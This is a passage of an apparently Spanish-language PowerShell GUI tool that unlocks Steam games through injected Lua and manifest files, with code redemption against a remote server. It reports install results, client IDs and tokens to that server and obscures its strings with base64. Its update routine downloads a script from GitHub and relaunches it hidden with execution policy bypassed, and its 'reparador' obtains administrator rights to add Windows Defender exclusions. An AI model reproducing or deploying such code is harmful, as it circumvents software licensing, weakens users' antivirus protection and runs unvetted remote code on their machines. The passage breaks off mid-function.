                    try { Mark-LoteDone $code $mfUrl @($installResult.lua) @($installResult.manifest) $gameName } catch {}
                    $successCount++
                } catch { $errors+="$gameName : $($_.Exception.Message)"; WEL "Download $gameName" $_ }
                Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
            }
        }
        if ($successCount -gt 0) {
            $lblR.ForeColor=$script:Green; $lblR.Text="$successCount de $total juegos activados ($modeNum)"
            if ($duration -gt 0 -and $expDate) { ScD $duration $expDate ($links[0]) }
            $script:rp.Invalidate(); RfC
            [System.Windows.Forms.MessageBox]::Show("$successCount de $total juegos activados correctamente ($modeNum).","Listo","OK","Information")
            try {
                $tokRep = $sendToken
                try { $ltR = Get-LocalToken; if ($ltR -and $ltR.token) { $tokRep = [string]$ltR.token } } catch {}
                Invoke-BgNoWait ({ param($u,$c,$i,$t)
                    try {
                        $bRep = @{code=$c;client_id=$i;token=$t} | ConvertTo-Json -Compress
                        Invoke-RestMethod -Uri ($u + "/api/install-ok") -Method Post -Body $bRep -ContentType "application/json" -TimeoutSec 10 -UseBasicParsing -ErrorAction Stop | Out-Null
                    } catch {}
                }) @([string]$usedUrl,[string]$code,[string]$script:clientId,[string]$tokRep)
            } catch {}
            try { Send-PatchStatus $code "OK $successCount/$total | Servidor: $usedUrl ($viaTxt)" } catch {}
        } else { throw "No se pudo activar ningun juego.`n$($errors -join '; ')" }
        }
    } catch {
        try { $script:uiBusy = $false } catch {}
        WEL (S("Q2FuamVv")) $_; $lblR.ForeColor=$script:Red
        $errMsg = $_.Exception.Message
        if ($errMsg -match 'Codigo invalido|C[oo]digo inv[aa]lido') { $errMsg = "Codigo invalido: NO existe en el servidor. Pedile al admin que lo cree de nuevo." }
        if ($_.Exception -is [System.Net.WebException]) {
            $httpResp = $_.Exception.Response
            if ($httpResp -and [int]$httpResp.StatusCode -eq 502) { $errMsg = "El servidor esta offline (502). Avisa al admin para que reinicie el tunel." }
            elseif ($_.Exception.Message -match "Unable to connect|NameResolutionFailure") { $errMsg = "No se pudo conectar al servidor. Revisa tu internet." }
            elseif ($_.Exception.Message -match "Timeout") { $errMsg = "El servidor no respondio a tiempo. Intenta de nuevo." }
        } elseif ($errMsg -match "Unable to connect|NameResolutionFailure|unable to resolve") {
            $errMsg = "No se pudo conectar al servidor. Revisa tu internet o pide al admin que reinicie el tunel."
        } elseif ($errMsg -match "Timeout|timed out") {
            $errMsg = "El servidor no respondio a tiempo. Intenta de nuevo."
        }
        try { $errMsg = $errMsg -replace 'https?://[^\s\)\]''"<>]+','[servidor]' } catch {}
        $lblR.Text="Error: $errMsg"
        $detalle = $_.Exception.Message
        if ($errors -and $errors.Count -gt 0) { $detalle += "`n`nJuegos fallados:`n" + ($errors -join "`n") }
        try { Send-ConnErrorBg $code $errMsg $detalle ([string]$script:serverUrl) ([string]$script:serverUrlCf) ([bool]$forceCf) ([string]$script:clientId) ([string]$script:version) } catch {}
        try { Send-PatchStatus $code "ERROR $errMsg / $($errors -join '; ')" } catch {}
        $lblR.Text="No se pudo canjear. Se envio el reporte."
        [System.Windows.Forms.Application]::DoEvents()
    }
})
$script:rp.Controls.Add($script:subB)
$txtC.Add_KeyDown({param($s,$e2);if($e2.KeyCode -eq 'Return'){$script:subB.PerformClick();$e2.Handled=$true;$e2.SuppressKeyPress=$true}})

$lblR=New-Object System.Windows.Forms.Label
$lblR.Text="";$lblR.Font=$FntSub;$lblR.ForeColor=$Gray;$lblR.BackColor=$BG
$lblR.Location=New-Object System.Drawing.Point($PAD,108);$lblR.Size=New-Object System.Drawing.Size($CW,16)
$script:rp.Controls.Add($lblR)

$div=New-BufferedPanel;$div.Location=New-Object System.Drawing.Point($PAD,130)
$div.Size=New-Object System.Drawing.Size($CW,1);$div.BackColor=$CardBorder
$script:rp.Controls.Add($div)

$script:codesT=New-Object System.Windows.Forms.Label
$script:codesT.Text=T (S("Y29kaWdvc0FjdGl2b3M="))
$script:codesT.Font=$FntSect;$script:codesT.ForeColor=$White;$script:codesT.BackColor=$BG
$script:codesT.AutoSize=$true;$script:codesT.Location=New-Object System.Drawing.Point($PAD,138)
$script:rp.Controls.Add($script:codesT)

$cBadge=New-Object System.Windows.Forms.Label
$cBadge.Font=$FntCodeSt;$cBadge.ForeColor=$Cyan;$cBadge.BackColor=$BG
$cBadge.AutoSize=$true;$cBadge.Location=New-Object System.Drawing.Point(170,144)
$script:rp.Controls.Add($cBadge)

$clH=($FH-$CY)-170
$script:clpScroll=0;$script:clpMaxScroll=0;$script:clpContentH=0;$script:clpDragging=$false;$script:clpGrabY=0
function Get-ClpThumb {
    $cw=$script:clp.ClientSize.Width;$chh=$script:clp.ClientSize.Height
    $sbw=4;$pad=3;$tx=($cw - $sbw - $pad)
    $th=[Math]::Max(24,[int](($chh * $chh) / [Math]::Max(1,$script:clpContentH)))
    $ty=0;if($script:clpMaxScroll -gt 0){$ty=[int](($chh - $th) * ($script:clpScroll / $script:clpMaxScroll))}
    return @{X=$tx;Y=$ty;W=$sbw;H=$th}
}
$script:clp=New-BufferedPanel
$script:clp.Location=New-Object System.Drawing.Point($PAD,164)
$script:clp.Size=New-Object System.Drawing.Size($CW,$clH);$script:clp.BackColor=$BG
$script:clp.Add_MouseWheel({
    param($s,$e)
    if($script:clpMaxScroll -gt 0){
        $step=[int](($e.Delta / 120) * 50)
        $script:clpScroll=[Math]::Max(0,[Math]::Min($script:clpMaxScroll,($script:clpScroll - $step)))
        $s.Invalidate();$e.Handled=$true
    }
})
$script:clp.Add_MouseDown({
    param($s,$e)
    if($script:clpMaxScroll -gt 0 -and $e.Button -eq 'Left'){
        $t=Get-ClpThumb
        if($e.X -ge $t.X -and $e.X -le ($t.X + $t.W) -and $e.Y -ge $t.Y -and $e.Y -le ($t.Y + $t.H)){
            $script:clpDragging=$true;$script:clpGrabY=($e.Y - $t.Y);$s.Capture=$true;$s.Invalidate()
        }
    }
})
$script:clp.Add_MouseMove({
    param($s,$e)
    if($script:clpDragging -and $script:clpMaxScroll -gt 0){
        $t=Get-ClpThumb
        $maxTy=($s.ClientSize.Height - $t.H)
        if($maxTy -gt 0){
            $newTy=($e.Y - $script:clpGrabY)
            $script:clpScroll=[int]($script:clpMaxScroll * ([Math]::Max(0,[Math]::Min($maxTy,$newTy)) / $maxTy))
            $s.Invalidate()
        }
    }
})
$script:clp.Add_MouseUp({param($s,$e);if($script:clpDragging){$script:clpDragging=$false;$s.Capture=$false;$s.Invalidate()}})
$script:clp.Cursor=[System.Windows.Forms.Cursors]::Hand
$script:clp.Add_Click({param($s,$e)
    try{
        $y=($e.Y + $script:clpScroll)
        if($y -lt 0){return}
        $step=92
        $idx=[int][math]::Floor($y / $step)
        $grp=@($script:clpGroups)
        if($idx -ge 0 -and $idx -lt $grp.Count){
            $g=$grp[$idx]
            if($g -and $g.Code){ Switch-ToCodeDetail ([string]$g.Code) }
        }
    }catch{}
})
$script:clp.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $script:clpMaxScroll=[Math]::Max(0,($script:clpContentH - $s.ClientSize.Height))
    if($script:clpScroll -gt $script:clpMaxScroll){$script:clpScroll=$script:clpMaxScroll}
    if($script:clpScroll -lt 0){$script:clpScroll=0}
    $g.TranslateTransform(0,-$script:clpScroll)
    $groups=@(Get-ActiveCodeGroups);$script:clpGroups=$groups;$codes=$groups
    $cBadge.Text="($($codes.Count))"
    if($codes.Count -eq 0){
        $script:clpContentH=60;$script:clpMaxScroll=0;$script:clpScroll=0;$g.ResetTransform()
        $p=New-RR 0 0 ($s.ClientSize.Width-1) 60 8
        $bg2=New-Object System.Drawing.SolidBrush($script:CardBG);$bp=New-Object System.Drawing.Pen($script:CardBorder,1)
        $g.FillPath($bg2,$p);$g.DrawPath($bp,$p);$bg2.Dispose();$bp.Dispose();$p.Dispose()
        $gb2=New-Object System.Drawing.SolidBrush($script:Gray)
        $f1=New-Object System.Drawing.Font("Bahnschrift",9.5)
        $msg=T (S("c2luQ29kaWdvcw=="));$msz=$g.MeasureString($msg,$f1)
        $g.DrawString($msg,$f1,$gb2,($s.ClientSize.Width - $msz.Width)/2,12)
        $f2=New-Object System.Drawing.Font("Segoe UI",8)
        $msg2=T (S("c2luQ29kaWdvc1N1Yg=="));$msz2=$g.MeasureString($msg2,$f2)
        $g.DrawString($msg2,$f2,$gb2,($s.ClientSize.Width - $msz2.Width)/2,33)
        $gb2.Dispose();$f1.Dispose();$f2.Dispose();return
    }
    
    $itemStep=92
    $off = if ($script:clockOffsetSec) { $script:clockOffsetSec } else { 0 }
    $now = (Get-Date).AddSeconds(-$off)
    $codes=@(@($codes) | Where-Object { try { ([int]$_.Duration -eq 0) -or (-not $_.ExpiresAt) -or (([datetime]$_.ExpiresAt) -gt $now) } catch { $true } })
    try { $cBadge.Text="($($codes.Count))" } catch {}
    $script:clpContentH=$codes.Count*$itemStep
    $firstIndex=[Math]::Max(0,[int][Math]::Floor($script:clpScroll / $itemStep))
    $lastIndex=[Math]::Min(($codes.Count - 1),[int][Math]::Floor(($script:clpScroll + $s.ClientSize.Height) / $itemStep))
    $ch2=86;$gp2=6
    for($i=$firstIndex;$i -le $lastIndex;$i++){
        $c=$codes[$i]
        $yP=$i*$itemStep
        $isPermanent = $c.Duration -eq 0
        if($isPermanent){$st="Permanente";$sc=$script:Green; $expStr = "Permanente"}
        else{
            $exp = $c.ExpiresAt
            if($exp){
                $timeLeft = $exp - $now
                $totalSec = $timeLeft.TotalSeconds
                if($totalSec -le 0){$st=T "expirado";$sc=$script:Red}
                else{
                    
                    if ($totalSec -le 300) { $sc=$script:Red }            
                    elseif ($totalSec -le 1800) { $sc=$script:Orange }  
                    elseif ($totalSec -le 7200) { $sc=$script:Yellow } 
                    else { $sc=$script:Green }                          
                    
                    if ($totalSec -lt 60) { $st="Expira en $([int]$totalSec)s" }
                    elseif ($totalSec -lt 3600) { $st="Expira en $([int][math]::Floor($timeLeft.TotalMinutes))m" }
                    elseif ($totalSec -lt 86400) { $st="Expira en $([int][math]::Floor($timeLeft.TotalHours))h" }
                    else { $st="Expira en $([int][math]::Floor($timeLeft.TotalDays))d" }
                }
                
                $diasEsp = @('Dom','Lun','Mar','Mie','Jue','Vie','Sab')
                $expDisp = ConvertTo-ClockTime $exp
                $diaSem = $diasEsp[$expDisp.DayOfWeek.value__]
                $expStr = "$diaSem $($expDisp.ToString('dd/MM/yyyy HH:mm'))"
            } else {$st=T "activo";$sc=$script:Green; $expStr = "--/--/----"}
        }
        $cdStr=""
        $cdCol=$sc
        if($c.ExpiresAt){
            $tl2=($c.ExpiresAt - $now)
            if($tl2.TotalSeconds -le 0){$cdStr=(T "expirado");$cdCol=$script:Red}
            elseif($tl2.TotalDays -ge 1){$cdStr="Falta: $([math]::Floor($tl2.TotalDays))d $($tl2.Hours)h $($tl2.Minutes)m $($tl2.Seconds)s"}
            elseif($tl2.TotalHours -ge 1){$cdStr="Falta: $([int]$tl2.TotalHours)h $($tl2.Minutes)m $($tl2.Seconds)s"}
            else{$cdStr="Falta: $([int]$tl2.TotalMinutes)m $($tl2.Seconds)s"}
        }
        $p2=New-RR 0 $yP ($s.ClientSize.Width-1) $ch2 8
        $bg3=New-Object System.Drawing.SolidBrush($script:CardBG);$bp2=New-Object System.Drawing.Pen($script:CardBorder,1)
        $g.FillPath($bg3,$p2);$g.DrawPath($bp2,$p2);$bg3.Dispose();$bp2.Dispose();$p2.Dispose()
        $hlp=New-Object System.Drawing.Pen($script:CardHover,1)
        $g.DrawLine($hlp,10,($yP+1),($s.ClientSize.Width-12),($yP+1));$hlp.Dispose()
        $dtBr=New-Object System.Drawing.SolidBrush($sc);$g.FillEllipse($dtBr,14,($yP+13),8,8);$dtBr.Dispose()
        $ctb=New-Object System.Drawing.SolidBrush($script:White);$g.DrawString($c.Code,$script:FntCodeT,$ctb,30,($yP+8));$ctb.Dispose()
        $gameLine="$($c.Games) juego(s)"
        $gtb=New-Object System.Drawing.SolidBrush($script:Gray);$g.DrawString($gameLine,$script:FntCodeS,$gtb,30,($yP+24));$gtb.Dispose()
        $etb=New-Object System.Drawing.SolidBrush($script:Gray)
        $g.DrawString("Expira: $expStr",$script:FntCodeS,$etb,30,($yP+40));$etb.Dispose()
        if($cdStr){
            $cdb=New-Object System.Drawing.SolidBrush($cdCol)
            $g.DrawString($cdStr,$script:FntCodeSt,$cdb,30,($yP+57));$cdb.Dispose()
        }
        $stb=New-Object System.Drawing.SolidBrush($sc);$stsz=$g.MeasureString($st,$script:FntCodeSt)
        $pillW=[int]$stsz.Width + 16;$pillX=($s.ClientSize.Width - $pillW - 10);$pillH=20
        $pillR=New-RR $pillX ($yP+4) $pillW $pillH 10
        $pillBr=New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(45,$sc.R,$sc.G,$sc.B))
        $g.FillPath($pillBr,$pillR);$pillBr.Dispose();$pillR.Dispose()
        $g.DrawString($st,$script:FntCodeSt,$stb,($pillX + 8),($yP + 6));$stb.Dispose()
    }
    $script:clpContentH=$codes.Count*$itemStep
    $script:clpMaxScroll=[Math]::Max(0,($script:clpContentH - $s.ClientSize.Height))
    if($script:clpScroll -gt $script:clpMaxScroll){$script:clpScroll=$script:clpMaxScroll}
    $g.ResetTransform()
    if($script:clpMaxScroll -gt 0){
        $t=Get-ClpThumb
        $tr=New-RR $t.X 0 $t.W $s.ClientSize.Height 4
        $trBr=New-Object System.Drawing.SolidBrush($script:CardBorder)
        $g.FillPath($trBr,$tr);$trBr.Dispose();$tr.Dispose()
        $thumbBrush=New-Object System.Drawing.SolidBrush($script:Cyan)
        $thr=New-RR $t.X $t.Y $t.W $t.H 4
        $g.FillPath($thumbBrush,$thr);$thumbBrush.Dispose();$thr.Dispose()
    }
})
$script:rp.Controls.Add($script:clp)
$form.Controls.Add($script:rp)
$form.Add_MouseWheel({
    param($s,$e)
    if($script:rp.Visible -and $script:clpMaxScroll -gt 0){
        $pt=$script:rp.PointToClient([System.Windows.Forms.Cursor]::Position)
        if($pt.Y -ge 0 -and $pt.Y -le $script:rp.Height){
            $step=[int](($e.Delta / 120) * 50)
            $script:clpScroll=[Math]::Max(0,[Math]::Min($script:clpMaxScroll,($script:clpScroll - $step)))
            $script:clp.Invalidate();$e.Handled=$true
        }
    }
})


$script:sp=New-BufferedPanel
$script:sp.Location=New-Object System.Drawing.Point(0,$CY)
$script:sp.Size=New-Object System.Drawing.Size($FW,($FH-$CY));$script:sp.BackColor=$BG;$script:sp.Visible=$false
$script:sp.AutoScroll=$false
$script:sp.Padding=New-Object System.Windows.Forms.Padding(0,0,0,0)

$script:sBack=New-BufferedPanel
$script:sBack.Location=New-Object System.Drawing.Point($PAD,12)
$script:sBack.Size=New-Object System.Drawing.Size(32,32);$script:sBack.BackColor=$BG
$script:sBack.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:sBack.Tag=@{Hover=$false}
$script:sBack.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:sBack.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:sBack.Add_Click({Switch-FromConfig})
$script:sBack.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $bc=if($s.Tag.Hover){$script:CardHover}else{$script:CardBG}
    $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 8
    $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
    $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
    $ap=New-Object System.Drawing.Pen($script:Cyan,2.5)
    $cx2=$s.Width/2;$cy2=$s.Height/2
    $g.DrawLine($ap,($cx2+4),($cy2-7),($cx2-4),$cy2)
    $g.DrawLine($ap,($cx2-4),$cy2,($cx2+4),($cy2+7));$ap.Dispose()
})
$script:sp.Controls.Add($script:sBack)

$script:sTitle=New-Object System.Windows.Forms.Label
$script:sTitle.Text=T "config"
$script:sTitle.Font=$script:FntRedeemTitle
$script:sTitle.ForeColor=$White;$script:sTitle.BackColor=$BG;$script:sTitle.AutoSize=$true
$script:sTitle.Location=New-Object System.Drawing.Point(([int]$PAD+42),14)
$script:sp.Controls.Add($script:sTitle)


$script:sVer=New-Object System.Windows.Forms.Label
$script:sVer.Text=$script:version
$script:sVer.Font=$FntSub
$script:sVer.ForeColor=$script:Gray
$script:sVer.BackColor=$BG
$script:sVer.AutoSize=$true
$script:sVer.Location=New-Object System.Drawing.Point(($FW-$PAD-40),20)
$script:sp.Controls.Add($script:sVer)


$sY=56
$script:cfgPage=1
$script:pageBtn1=New-Object System.Windows.Forms.Button
$script:pageBtn1.Text="Pagina 1";$script:pageBtn1.Location=New-Object System.Drawing.Point(($PAD+52),48);$script:pageBtn1.Size=New-Object System.Drawing.Size(80,22);$script:pageBtn1.BackColor=$script:CardBG;$script:pageBtn1.ForeColor=$White;$script:pageBtn1.FlatStyle="Flat";$script:pageBtn1.Font=$FntSub
$script:pageBtn2=New-Object System.Windows.Forms.Button
$script:pageBtn2.Text="Pagina 2";$script:pageBtn2.Location=New-Object System.Drawing.Point(($PAD+142),48);$script:pageBtn2.Size=New-Object System.Drawing.Size(80,22);$script:pageBtn2.BackColor=$script:CardBG;$script:pageBtn2.ForeColor=$White;$script:pageBtn2.FlatStyle="Flat";$script:pageBtn2.Font=$FntSub
$script:devLogVisible=$false
function Switch-CfgPage([int]$p){
 $script:cfgPage=$p
 $on1=($p -eq 1); $on2=($p -eq 2)
 $script:pageBtn1.BackColor=if($on1){$script:Cyan}else{$script:CardBG}
 $script:pageBtn1.ForeColor=if($on1){[System.Drawing.Color]::White}else{[System.Drawing.Color]::FromArgb(180,180,180)}
 $script:pageBtn2.BackColor=if($on2){$script:Cyan}else{$script:CardBG}
 $script:pageBtn2.ForeColor=if($on2){[System.Drawing.Color]::White}else{[System.Drawing.Color]::FromArgb(180,180,180)}
 @($script:sWatcher,$script:sHist,$script:sKill,$script:sPatch,$script:sDelGame,$script:sEliminar,$script:sActualizar) | ForEach-Object { if($_){$_.Visible=$on1} }
 if($null -ne $script:sLogLabel){$script:sLogLabel.Visible=($on1 -and $script:devLogVisible)}
 if($null -ne $script:sLogBox){$script:sLogBox.Visible=($on1 -and $script:devLogVisible)}
  @($script:sRepair,$script:sMigrar,$script:sAutoLua,$script:sDropsV2,$script:sDiag,$script:sPatch2) | ForEach-Object { if($_){$_.Visible=$on2} }
 if($null -ne $script:sFixDl){$script:sFixDl.Visible=$false}
 if($null -ne $script:sLuaTools){$script:sLuaTools.Visible=$false}
 if($null -ne $script:sLogLabel2){$script:sLogLabel2.Visible=($on2 -and $script:devLog2Visible)}
 if($null -ne $script:sLogBox2){$script:sLogBox2.Visible=($on2 -and $script:devLog2Visible)}
 $script:sp.Invalidate()
}
$script:pageBtn1.Add_Click({ Switch-CfgPage 1 })
$script:pageBtn2.Add_Click({ Switch-CfgPage 2 })
$script:sp.Controls.Add($script:pageBtn1)
$script:sp.Controls.Add($script:pageBtn2)
$script:modeBtn=New-Object System.Windows.Forms.Button
$script:modeBtn.Location=New-Object System.Drawing.Point(250,48);$script:modeBtn.Size=New-Object System.Drawing.Size(212,22);$script:modeBtn.FlatStyle="Flat";$script:modeBtn.Font=$FntSub
$script:modeBtn.Add_Click({
    $script:redeemParallel=-not $script:redeemParallel
    try{ New-Item -Path "HKCU:\Software\Bsmap" -Force | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name RedeemParallel -Value ([int]$script:redeemParallel) -Type DWord -Force }catch{}
    $script:modeBtn.Text=if($script:redeemParallel){"Canje: TODOS (cambiar)"}else{"Canje: 1x1 (cambiar)"}
    $script:modeBtn.BackColor=if($script:redeemParallel){$script:CardBG}else{[System.Drawing.Color]::FromArgb(45,35,15)}
})
$script:modeBtn.Text=if($script:redeemParallel){"Canje: TODOS (cambiar)"}else{"Canje: 1x1 (cambiar)"}
$script:modeBtn.BackColor=if($script:redeemParallel){$script:CardBG}else{[System.Drawing.Color]::FromArgb(45,35,15)}
$script:modeBtn.ForeColor=$script:Gray
$script:sp.Controls.Add($script:modeBtn)
$sY=78
function New-CfgBtn([int]$y,[string]$txt,[string]$sub,[scriptblock]$click,$accent){
    $pn=New-BufferedPanel
    $pn.Location=New-Object System.Drawing.Point($PAD,$y)
    $pn.Size=New-Object System.Drawing.Size($CW,50);$pn.BackColor=$BG
    $pn.Cursor=[System.Windows.Forms.Cursors]::Hand;$pn.Tag=@{Hover=$false;Txt=$txt;Sub=$sub;Accent=$accent}
    $pn.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
    $pn.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
    $pn.Add_Click($click)
    $pn.Add_Paint({param($s,$e)
        $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
        $n=$s.Tag;$bc=if($n.Hover){$script:CardHover}else{$script:CardBG}
        if($n.Accent){ $bc=if($n.Hover){[System.Drawing.Color]::FromArgb(58,196,110)}else{$n.Accent} }
        $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 8
        $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
        $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
        $tw=New-Object System.Drawing.SolidBrush($script:White)
        $g.DrawString($n.Txt,$script:FntCard,$tw,14,7);$tw.Dispose()
        $sw=New-Object System.Drawing.SolidBrush($(if($n.Accent){[System.Drawing.Color]::FromArgb(232,250,238)}else{$script:Gray}))
        $g.DrawString($n.Sub,$script:FntSub,$sw,14,27);$sw.Dispose()
        $ab=New-Object System.Drawing.SolidBrush($(if($n.Accent){$script:White}else{$script:Cyan}))
        $asz=$g.MeasureString(">",$script:FntArrow)
        $g.DrawString(">",$script:FntArrow,$ab,$s.Width-$asz.Width-10,($s.Height-$asz.Height)/2);$ab.Dispose()
    })
    return $pn
}

function Invoke-EliminarActivacion {
    try { Get-Process steam,steamwebhelper -ErrorAction SilentlyContinue | Stop-Process -Force } catch {}
    Start-SleepDoEvents 2000
    $root=$null; try { $root=Get-SteamPath } catch {}
    $borrados=0
    if (-not $root) { return 0 }
    $targets=@('dwmapi.dll','xinput1_4.dll','winmm.dll','OpenSteamTool.dll','SteamDaddy.dll','DepotBoxTool.dll','version.dll','dxgi.dll','opensteamtool.toml','steamdaddy_config.json','opensteamtool','steamdaddy','steamtools')
    foreach($sub in @('', 'Win64')){
        foreach($t in $targets){
            $p = if($sub){ Join-Path (Join-Path $root $sub) $t } else { Join-Path $root $t }
            if(Test-Path -LiteralPath $p){ try{ Remove-Item -LiteralPath $p -Recurse -Force -ErrorAction Stop; $borrados++ }catch{} }
        }
    }
    foreach($d in @((Join-Path $root 'config\stplug-in'),(Join-Path $root 'config\lua'))){
        if(Test-Path -LiteralPath $d){
            Get-ChildItem -LiteralPath $d -Filter *.lua -Force -ErrorAction SilentlyContinue | ForEach-Object { try { Remove-Item -LiteralPath $_.FullName -Force -ErrorAction Stop; $borrados++ } catch {} }
        }
    }
    foreach($d in @((Join-Path $root 'depotcache'),(Join-Path $root 'config\depotcache'))){
        if(Test-Path -LiteralPath $d){
            Get-ChildItem -LiteralPath $d -Filter *.manifest -Force -ErrorAction SilentlyContinue | ForEach-Object { try { Remove-Item -LiteralPath $_.FullName -Force -ErrorAction Stop; $borrados++ } catch {} }
        }
    }
    try { Set-ParcheInstalado $false } catch {}
    return $borrados
}
function Invoke-ActualizarApp {
    $cur = [string]$script:version
    $apiUrl = "https://api.github.com/repos/bastisayes/BastissSteamV18/contents/activator_obf3_token.ps1"
    $rawUrl = "https://raw.githubusercontent.com/bastisayes/BastissSteamV18/main/activator_obf3_token.ps1"
    $latest = $null
    try {
        $aj = Invoke-RestMethod -Uri ($apiUrl + '?v=' + [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()) -UseBasicParsing -TimeoutSec 12 -Headers @{'User-Agent'='Mozilla/5.0'} -ErrorAction Stop
        if ($aj.content) {
            $b64 = ([string]$aj.content).Replace("`n","").Replace("`r","").Replace(" ","")
            $latest = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64))
        }
    } catch {}
    if (-not $latest) {
        try {
            $latest = Invoke-RestMethod -Uri ($rawUrl + '?v=' + [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()) -UseBasicParsing -TimeoutSec 15 -Headers @{'User-Agent'='Mozilla/5.0'} -ErrorAction Stop
            if ($latest -isnot [string] -or $latest.Length -lt 1000) { $latest = $null }
        } catch { $latest = $null }
        if (-not $latest) { return "No se pudo contactar el servidor de updates. Revisa tu internet." }
    }
    if (-not $latest -or $latest.Length -lt 50000 -or $latest -notmatch '\$script:version') { return "Descarga invalida, no se aplico nada." }
    $rm = [regex]::Match($latest, '\$script:version\s*=\s*"([^"]+)"')
    $rem = if ($rm.Success) { $rm.Groups[1].Value } else { "" }
    if ($rem -and $rem -eq $cur) { return "Ya tienes la ultima version ($cur)." }
    try { Update-LocalExe } catch {}
    $self = $PSCommandPath
    if ($self -and (Test-Path -LiteralPath $self) -and $self -match '\.ps1$') {
        try {
            $tmpNew = "$self.new"
            [System.IO.File]::WriteAllText($tmpNew, $latest, (New-Object System.Text.UTF8Encoding $false))
            $perrs = $null
            [System.Management.Automation.Language.Parser]::ParseFile($tmpNew, [ref]$null, [ref]$perrs) | Out-Null
            if (@($perrs).Count -gt 0) { Remove-Item -LiteralPath $tmpNew -Force -ErrorAction SilentlyContinue; return "La version descargada no paso validacion, no se aplico nada." }
            Move-Item -LiteralPath $tmpNew -Destination $self -Force
            Start-Process -FilePath powershell.exe -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$self`"")
            Start-Sleep -Seconds 1
            exit
        } catch { return "Fallo al aplicar update: $($_.Exception.Message)" }
    }
    return "Hay nueva version ($rem). Reinicia el launcher para cargarla."
}


$script:sWatcher=New-BufferedPanel
$script:sWatcher.Location=New-Object System.Drawing.Point($PAD,$sY)
$script:sWatcher.Size=New-Object System.Drawing.Size($CW,50);$script:sWatcher.BackColor=$BG
$script:sWatcher.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:sWatcher.Tag=@{Hover=$false}
$script:sWatcher.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:sWatcher.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:sWatcher.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $n=$s.Tag;$bc=if($n.Hover){$script:CardHover}else{$script:CardBG}
    $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 8
    $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
    $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
    $we=$script:watcherEnabled
    $wp=$script:watcherProcess
    $he=if($wp){try{$wp.Refresh();$wp.HasExited}catch{$false}}else{$true}
    $wOn=$we -and $wp -and -not $he
    $st=if($wOn){(T (S("cmVwYXJhZG9yT24=")))}else{(T (S("cmVwYXJhZG9yT2Zm")))}
    $tw=New-Object System.Drawing.SolidBrush($script:White);$g.DrawString($st,$script:FntCard,$tw,14,7);$tw.Dispose()
    $sub=if($wOn){(S("Q2xpY2sgcGFyYSBkZXNhY3RpdmFyIGVsIHJlcGFyYWRvcg=="))}else{(S("Q2xpY2sgcGFyYSBhY3RpdmFyIGVsIHJlcGFyYWRvcg=="))}
    $sw=New-Object System.Drawing.SolidBrush($script:Gray);$g.DrawString($sub,$script:FntSub,$sw,14,27);$sw.Dispose()
    $clr=if($wOn){$script:Green}else{$script:Red}
    $dot=New-Object System.Drawing.SolidBrush($clr);$g.FillEllipse($dot,($s.Width-152),20,10,10);$dot.Dispose()
})
$script:sWatcher.Add_Click({
    $wRunning=$script:watcherProcess -and -not $script:watcherProcess.HasExited
    if ($wRunning) {
        try { $script:watcherProcess.Kill(); $script:watcherProcess.WaitForExit(2000) } catch {}
        $script:watcherProcess = $null; $script:watcherEnabled = $false
        Set-ReparadorFlag 0
        try { Add-Content -Path $script:watcherLogPath -Value "[$(Get-Date -Format 'HH:mm:ss')] [TOGGLE] Reparador detenido por usuario" -Encoding UTF8 } catch {}
        [System.Windows.Forms.MessageBox]::Show((S("UmVwYXJhZG9yIGRlc2FjdGl2YWRvLg==")),(S("UmVwYXJhZG9y")),"OK","Information") | Out-Null
    } else {
        $msgResult = [System.Windows.Forms.MessageBox]::Show("Para activar el reparador se pedira permiso de administrador UNA sola vez.`n`nContinuar?",(S("QWN0aXZhciBSZXBhcmFkb3I=")),"YesNo","Information")
        if ($msgResult -ne "Yes") { $script:sWatcher.Invalidate(); return }
        [System.Windows.Forms.Application]::DoEvents()
        $exOk = Add-SteamDefenderExclusions
        if (-not $exOk) {
            [System.Windows.Forms.MessageBox]::Show((S("Tm8gc2UgcHVkbyBjb21wbGV0YXIgbGEgY29uZmlndXJhY2lvbiBkZWwgc2lzdGVtYS4gRWwgcmVwYXJhZG9yIHB1ZWRlIGZ1bmNpb25hciBpZ3VhbCBwZXJvIHNlcmEgbWVub3MgZWZpY2llbnRlLg==")),"Aviso","OK","Warning") | Out-Null
        }
        $started = Start-WatcherProcess
        if (-not $started) {
